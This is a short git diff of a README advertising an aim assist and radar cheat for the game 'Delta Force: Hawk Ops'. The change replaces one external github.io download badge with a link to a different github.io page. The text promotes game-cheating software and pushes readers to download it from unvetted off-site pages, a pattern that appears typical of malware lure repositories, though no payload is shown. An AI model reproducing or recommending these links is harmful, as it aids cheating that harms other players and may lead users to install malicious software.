@@ -1,11 +1,7 @@
 # 🎯🛰️ **DELTA FORCE: HAWK OPS – ADVANCED AIM ASSIST + RADAR TOOL**  
 ### *See more. Aim better. Dominate smarter.*
 
-<p align="center">
-  <a href="https://delta-force-free-aim-assist.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-AIM_ASSIST_&_RADAR_FOR_HAWK_OPS-0055FF?style=for-the-badge&logo=target&logoColor=white" alt="Download Delta Force Aim Assist Radar Tool" />
-  </a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://cornilovarchip.github.io/.github/delta-force-free-aim-assist)
 
 ---
 
